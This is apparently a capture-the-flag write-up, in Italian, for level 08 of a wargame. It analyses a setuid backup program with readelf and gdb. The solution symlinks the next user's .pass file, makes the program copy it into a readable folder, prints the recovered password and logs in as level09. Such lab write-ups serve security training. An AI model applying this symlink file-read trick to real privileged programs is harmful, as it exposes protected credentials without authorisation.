# Level 08
Controlliamo le stringhe presenti nel binario:
```
level08@OverRide:~$ readelf -p '.rodata' level08

String dump of section '.rodata':
  [     6]  LOG: %s^J
  [     f]  Usage: %s filename^J
  [    23]  w
  [    25]  ./backups/.log
  [    34]  ERROR: Failed to open %s^J
  [    4e]  Starting back up:
  [    61]  r
  [    63]  ./backups/
  [    6e]  ERROR: Failed to open %s%s^J
  [    8a]  Finished back up
```
e analizziamo con `gdb`:
```
level08@OverRide:~$ gdb -q level08
Reading symbols from /home/users/level08/level08...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x00000000004006c0  _init
0x00000000004006f0  strcpy
0x00000000004006f0  strcpy@plt
0x0000000000400700  write
0x0000000000400700  write@plt
0x0000000000400710  fclose
0x0000000000400710  fclose@plt
0x0000000000400720  __stack_chk_fail
0x0000000000400720  __stack_chk_fail@plt
0x0000000000400730  printf
0x0000000000400730  printf@plt
0x0000000000400740  snprintf
0x0000000000400740  snprintf@plt
0x0000000000400750  strncat
0x0000000000400750  strncat@plt
0x0000000000400760  fgetc
0x0000000000400760  fgetc@plt
0x0000000000400770  close
0x0000000000400770  close@plt
0x0000000000400780  strcspn
0x0000000000400780  strcspn@plt
0x0000000000400790  __libc_start_main
0x0000000000400790  __libc_start_main@plt
0x00000000004007a0  fprintf
0x00000000004007a0  fprintf@plt
0x00000000004007b0  open
0x00000000004007b0  open@plt
0x00000000004007c0  fopen
0x00000000004007c0  fopen@plt
0x00000000004007d0  exit
0x00000000004007d0  exit@plt
0x00000000004007e0  _start
0x000000000040080c  call_gmon_start
0x0000000000400830  __do_global_dtors_aux
0x00000000004008a0  frame_dummy
0x00000000004008c4  log_wrapper
0x00000000004009f0  main
0x0000000000400c60  __libc_csu_init
0x0000000000400cf0  __libc_csu_fini
0x0000000000400d00  __do_global_ctors_aux
0x0000000000400d38  _fini
```

### Funzione `main`:
Apre il file `.log` presente nella cartella `backups` e successivamente apre il file dato
come primo argomento per poi aggiungere al nome del file il percorso `./backups/`
e dunque creare il file dove andrà a fare una copia.

### Funzione `log_wrapper`
Scrive nel file passato come argomento la stringa passata.

### Soluzione
Basta creare un collegamento al file `/home/users/level09/.pass`, così che il programma legge e duplica
il file nella cartella `backups` e noi abbiamo i permessi per leggerlo:
```
level08@OverRide:~$ chmod +w .
level08@OverRide:~$ ln -s /home/users/level09/.pass exploit
level08@OverRide:~$ ./level08 exploit
level08@OverRide:~$ cat backups/exploit
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
```
level08@OverRide:~$ su level09
Password: fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
level09@OverRide:~$
```